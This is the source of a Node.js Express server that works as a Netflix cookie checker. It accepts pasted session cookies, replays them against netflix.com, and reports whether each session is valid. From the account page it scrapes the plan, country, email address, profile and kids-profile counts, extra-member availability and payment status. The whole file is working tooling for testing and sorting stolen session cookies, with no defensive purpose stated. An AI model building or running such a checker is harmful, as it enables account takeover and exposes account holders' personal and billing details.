import express from "express";
import cors from "cors";
import fetch from "node-fetch";
import path from "path";

const app = express();

app.use(cors());
app.use(express.json());

/* =========================
   SERVE FRONTEND
========================= */

const __dirname = new URL('.', import.meta.url).pathname;

app.use(express.static("dist"));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "dist/index.html"));
});

/* =========================
   COOKIE CONVERTER
========================= */

function convertCookieFormat(raw) {

  if (!raw) return "";

  const cookies = [];

  const lines = raw.split(/\r?\n/);

  for (let line of lines) {

    line = line.trim();

    if (!line) continue;
    if (line.startsWith("#")) continue;

    // Netscape cookie file
    if (line.includes(".netflix.com") || line.includes("netflix.com")) {

      const parts = line.split(/\s+/);

      if (parts.length >= 7) {
        const name = parts[5];
        const value = parts[6];
        cookies.push(name + "=" + value);
      }

    }

    // Already in header format
    else if (line.includes("=") && !line.includes("\t")) {
      cookies.push(line);
    }

  }

  return cookies.join("; ");
}

/* =========================
   CHECK API
========================= */

app.post("/api/check", async (req, res) => {

  let { cookie } = req.body;

  if (!cookie) {
    return res.json({ status: "INVALID" });
  }

  try {

    cookie = convertCookieFormat(cookie);

    const response = await fetch("https://www.netflix.com/browse", {
  headers: {
    cookie: cookie,
    "user-agent": "Mozilla/5.0"
  },
  redirect: "follow"
});

const text = await response.text();

if (response.url.includes("login") || text.includes("Sign In")) {
  return res.json({ status: "INVALID" });
}



   /* =========================
   PARSE ACCOUNT DATA
========================= */

let plan = "UNKNOWN";

if (text.toLowerCase().includes("premium")) plan = "PREMIUM";
else if (text.toLowerCase().includes("standard")) plan = "STANDARD";
else if (text.toLowerCase().includes("basic")) plan = "BASIC";
else if (text.toLowerCase().includes("mobile")) plan = "MOBILE";


let country = "UNKNOWN";
const countryMatch = text.match(/"currentCountry":"(.*?)"/);

if (countryMatch) {
  country = countryMatch[1];
}


let email = "UNKNOWN";
const emailMatch = text.match(/"email":"(.*?)"/);

if (emailMatch) {
  email = emailMatch[1];
}


let profiles = 0;
const profileMatches = text.match(/profileName/g);

if (profileMatches) {
  profiles = profileMatches.length;
}


let kidsProfiles = 0;
const kidsMatch = text.match(/"isKids":true/g);

if (kidsMatch) {
  kidsProfiles = kidsMatch.length;
}


let extraMembers = "NONE";

if (text.toLowerCase().includes("extra member")) {
  extraMembers = "AVAILABLE";
}


let paymentStatus = "UNKNOWN";

if (text.toLowerCase().includes("visa") ||
    text.toLowerCase().includes("mastercard") ||
    text.toLowerCase().includes("paypal") ||
    text.toLowerCase().includes("billing")) {

  paymentStatus = "ACTIVE";
}
    res.json({
      status: "VALID",
      plan,
      country,
      profiles,
      kidsProfiles,
      extraMembers,
      email,
      paymentStatus
    });

  } catch (err) {

    console.error(err);
    res.json({ status: "ERROR" });

  }

});

/* =========================
   START SERVER
========================= */

const PORT = process.env.PORT || 8080;

app.listen(PORT, "0.0.0.0", () => {
  console.log("Checker server running on port " + PORT);
});
